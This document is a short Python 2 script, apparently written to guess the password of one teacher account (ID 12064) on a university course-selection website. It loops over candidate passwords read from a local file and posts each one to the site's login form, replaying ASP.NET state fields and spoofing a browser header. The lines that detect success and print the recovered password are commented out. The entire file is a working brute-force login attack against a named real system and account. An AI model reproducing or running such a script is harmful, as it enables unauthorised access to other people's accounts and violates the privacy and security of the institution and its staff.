# -*- coding: utf-8 -*-
import urllib
import urllib2
import cookielib

#cookie-seemed useless
cookie=cookielib.CookieJar()
opener=urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))
id=open("D://sample.txt")
urllib2.install_opener(opener)

#open my huizhibianhao
while 1:
    a=id.readline()
    a=a.strip('\n')
    postdata=urllib.urlencode({
        '__VIEWSTATE':'/wEPDwUKMTg5NjY5MDM3OWRkRepo7pgO2y5BnwW7HGaJWwNW1Mk=',
        'TextBox1':'12064',
        'TextBox2':a,
        'ddl_js':'教师',
        'Button1':' 登 录 ',
        '__EVENTVALIDATION':'/wEWCAKXgp+kBQLs0bLrBgLs0fbZDALCj9HECwL95NKZCAKwoPbBBQKbwbi2CAKM54rGBm5TBp1xSds05r79b4om/ydQD6/+'
    })

    headers={
    'User-agent':'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1',
    'Referer':'http://xk2.ahu.cn/default3.aspx',
    'Host':'xk2.ahu.cn'
    }
    

    rep=urllib2.Request(
        url='http://xk2.ahu.cn/default3.aspx',
        data=postdata,
        headers=headers
     )
    result=opener.open(rep).geturl()
    
#    print opener.open(rep).read()
#    print result
#    answer='http://xk2.ahu.cn/Default3.aspx'
       
#    if result==answer:
 #       print a,"is wrong password "
 #   else:
  #      print "ID:12064的密码是",a
   #     break

raw_input()           
       


